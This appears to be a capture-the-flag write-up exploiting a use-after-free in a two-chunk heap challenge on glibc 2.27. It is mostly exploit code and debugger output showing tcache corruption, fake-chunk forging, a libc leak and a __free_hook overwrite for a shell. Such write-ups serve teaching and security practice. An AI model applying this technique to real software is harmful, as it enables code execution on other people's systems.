# information
Runing on Ubuntu 18.04, with libc-2.27.so.
Four kinds of operations exists: `new`, `edit`, `delete`, `show`. Fortunately, we got a leak method here.
```
1. new
2. edit
3. delete
4. show
Your choice:
```
There are some contrains:
1. You can only use two chunks.
2. Chunk size is fixed to 0x48.
3. You can choose weather to clear the global array or not.
# bug
Typically UAF
# exploit
How to leverage this UAF to exploit is really important.
The thing is that we cant make a chunk larger than 0x400 to leak the libc. Can we?
`x2.py` explained why we cant make a chunk larger than 0x400, the main reason is that we only have two chunks to use. If we want to edit anything on the heap, we should have at least 3 chunks.

So we must find another way to exploit it.
use the chunk arrange system unalignment to make a 0x60 size chunk
```python
# allocate chunk at heap + 0x68, make it aligned
 new(p64(0) * 7 + p64(0x61) + p64(heap_addr + 0x68)) # make a fake chunk
 new('1' * 8)
 for i in range(7):
     delete(0)
 delete(1, 1)
 delete(0, 1)
 new('c')
 new('d')
 
 # create fake chunk and leak libc
 delete(1, 1)
 gdb.attach(io, '')

```
Bins will look like this. See, you get a 0x60 tcache bin.
Also, you will find that the FD of 0x40 tcache bin points to `heap_addr + 0x68`. This is what we set before.
```
Tcachebins[idx=3, size=0x40] count=5  ←  Chunk(addr=0x555555757068, size=0x0, flags=)  ←  Chunk(addr=0x555555757068, size=0x0, flags=)  →  [loop detected]
Tcachebins[idx=4, size=0x50] count=1  ←  Chunk(addr=0x5555557572a0, size=0x60, flags=PREV_INUSE) 
────────────────────── Fastbins for arena 0x155555326c40 ──────────────────────
Fastbins[idx=0, size=0x10] 0x00
Fastbins[idx=1, size=0x20] 0x00
Fastbins[idx=2, size=0x30] 0x00
Fastbins[idx=3, size=0x40]  ←  Chunk(addr=0x555555757260, size=0x50, flags=PREV_INUSE)  ←  Chunk(addr=0x555555757273, size=0x0, flags=) [incorrect fastbin_index] 
Fastbins[idx=4, size=0x50] 0x00
Fastbins[idx=5, size=0x60] 0x00
Fastbins[idx=6, size=0x70] 0x00
```
Then overwrite the tcache_entries(0x40) to 0. Now if you type `heap bins` in the gef, you will find that there will be no more tcache bins here, the freed chunk will be an orphan. This skills will be used severals times later.
``
──────────────────────────────── Tcachebins for arena 0x155555326c40 ────────────────────────────────
Tcachebins[idx=4, size=0x50] count=1  ←  Chunk(addr=0x5555557572a0, size=0x60, flags=PREV_INUSE) 
───────────────────────────────── Fastbins for arena 0x155555326c40 ─────────────────────────────────
Fastbins[idx=0, size=0x10] 0x00
Fastbins[idx=1, size=0x20] 0x00
Fastbins[idx=2, size=0x30] 0x00
Fastbins[idx=3, size=0x40]  ←  Chunk(addr=0x555555757260, size=0x50, flags=PREV_INUSE)  ←  Chunk(addr=0x555555757273, size=0x0, flags=) [incorrect fastbin_index] 
Fastbins[idx=4, size=0x50] 0x00
Fastbins[idx=5, size=0x60] 0x00
Fastbins[idx=6, size=0x70] 0x00
```
After this, we can always overwrite the `tcache_entries` with `edit(1, xxxxx)`. 
Then we clean up the fastbin list and malloc a new 0x50 size chunk from the top.
```python
 delete(1, 1) # add into the 0x60 tache list
 new(p64(0)) # 1 fix the FD, and it will be at the fake addr, overwrite the tcache_entries to 0
 edit(0, p64(0) * 3 + p64(0xa1)) # fake size
 delete(0, 1) # add into the 0x40 tcache list
 edit(1, p64(0)) # then overwrite the tcache_entries to 0 again
 new('a') # get from 0x40 fastbin list
 delete(0, 1) # delete it, and will be added into 0x40 tcache list
 edit(1, p64(0)) # overwrite tcache_entries to 0 again
 new(p64(0x21) * 9) # get from top_chunk
 delete(0, 1) # just remove it
```
Then we just edit the entry to our 0xa0 fake chunk, and free it more than 7 times to get the libc address. Modify the entry again to leak.
```
 edit(1, p64(heap_addr + 0x280)) # overwrite tcache_entries to 0xa0 fake chunk
 new('bbbbbbbb') # allocated a 0xa0 chunk
 for i in range(7):
     delete(0)
 delete(0, 1) # now we get the libc address
 edit(1, p64(heap_addr + 0x260))
 new('a' * 0x20)
 show(0)
 io.recvuntil("a" * 0x20)
 libc_addr = myu64(io.recvn(6)) - 0x3ebca0
 libc.address = libc_addr
 log.info("\033[33m" + hex(libc_addr) + "\033[0m")

```
Then we can just edit the `__free_hook` and enjoy the shell.

# thinkings
Control the tcache_entries means that you can control everything.






